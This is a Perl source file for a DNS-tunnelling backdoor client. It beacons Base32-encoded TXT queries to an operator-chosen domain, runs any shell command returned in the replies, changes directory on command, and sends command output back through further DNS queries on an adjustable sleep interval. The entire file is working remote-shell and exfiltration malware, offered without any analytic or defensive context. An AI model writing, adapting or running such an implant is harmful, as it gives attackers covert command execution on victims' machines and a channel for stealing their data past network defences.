###############################
# To Do
# * split/order queries that are > than X bytes
# * Support multiple encoding
###############################
use warnings;
use strict;
use Net::DNS;
use MIME::Base32 qw( RFC );
use IO::CaptureOutput qw(capture qxx);

###############################
# Global Variables
###############################
my $domain;
my $debug;
my $client_id = int(rand(65535));
#my $client_id = 100;

###############################
# Parse User Args
###############################
foreach (@ARGV) {
	if ($_ eq "-d") {
		$debug = 1;
	}elsif ($_ =~ /--domain=(.*)/) {
		$domain = $1;
	}
}

if ($debug) {
	print "DEBUG: $debug\n";
	print "DOMAIN: $domain\n";
}

###############################
# Subroutines
###############################
sub roundup {
	my $n = shift;
	return(($n == int($n)) ? $n : int($n+1));
}

sub debug {
	if ($debug) {
		print "$_[0] => $_[1]\n";
	}
}

sub parse {
	return MIME::Base32::decode($_[0]);
}

sub sendQuery{
	my $msg = $_[0];
	my $cmd = $_[1];
	if (length($msg) == 0) {
		$msg = "NULL";
	}	
	my $msg_encoded = MIME::Base32::encode($msg);

	debug("CLIENT_ID", $client_id);
	my $client_id_encoded = MIME::Base32::encode($client_id);
	debug("CLIENT_ID_ENCODED", $client_id_encoded);
	debug("MSG_ENCODED LENGTH", length($msg_encoded));
	
	
	my $parts = roundup(length($msg_encoded) / 63);
	debug("NUM OF PARTS", $parts);
	
	my @chunks = ($msg_encoded =~ /.{1,63}/gs);
	my $return;
	for (my $part = 0; $part < $parts; $part++) {
		debug("PART: $part", "$chunks[$part] (" . length($chunks[$part]) . ")");
	
		my $query = "$chunks[$part].$part.$parts.$cmd.$client_id_encoded.$domain";
		if ($debug) {
			print "QUERY: $query (" . length($query) . ")\n";
		}
		my $res = Net::DNS::Resolver->new();
		my $answer = $res->query($query, 'TXT');
		if($answer) {
			foreach my $rr ($answer->answer) {
				next unless $rr->type eq "TXT";
				debug("RESPONSE_ENCODED:", $rr->txtdata);
				$return = $rr->txtdata;
			}
		}
	}
	return $return;
}

sub shell{
		my $exec_rsp = "NULL";
		my $client_cmd = "NULL";
		my $sleep_value = 60;
        while(1) {
				debug("EXEC_RSP", $exec_rsp);
				debug("CLIENT_CMD", $client_cmd);
				my $response = sendQuery($exec_rsp, $client_cmd);
				my @args = split(/\./, $response);
				my $cmd = $args[0];
				debug("CMD", $cmd);
				my $payload = MIME::Base32::decode($args[1]);
				debug("PAYLOAD", $payload);
				if ($cmd eq "UPLOAD") {
					debug("CMD", $cmd);
				} elsif ($cmd eq "DOWNLOAD") {
					debug("CMD", $cmd);
				} elsif ($cmd eq "SLEEP") {
					debug("CMD", $cmd);
					$sleep_value = $payload;
					$exec_rsp = "Sleep set to $payload\n";
				} elsif ($cmd eq "EXEC") {
					debug("CMD", $cmd);
				} elsif ($cmd eq "CMD" ) {
					if ($payload ne "NULL") {
						my ($stdout, $stderr, $success, $exit_code) = IO::CaptureOutput::capture_exec($payload);
						if($stdout) {
							$exec_rsp = $stdout;
						} elsif ($stderr) {
							$exec_rsp = $stderr;
						} elsif($exit_code) {
							$exec_rsp = "COMMAND EXITED WITH: FAILURE\n"
						} elsif($exit_code == 0) {
							$exec_rsp = "COMMAND EXITED WITH: SUCCESS\n";
						}
						$client_cmd = "CMD";
					}
				} elsif($cmd eq "CWD") {
					if(chdir $payload) {
						$exec_rsp = "COMMAND EXITED WITH: SUCCESS\n";
					} else {
						$exec_rsp = "COMMAND EXITED WITH: FAILURE\n";
					}
					$client_cmd = "CWD";
				} elsif ($cmd eq "NULL") {
					debug("CMD", $cmd);
					$exec_rsp = "NULL";
				} else {
					debug("INVALID CMD", $cmd);
				}
				debug("LINE SEPERATOR", "======================================");
				sleep $sleep_value;
        }
}
###############################
# Main
###############################
shell();
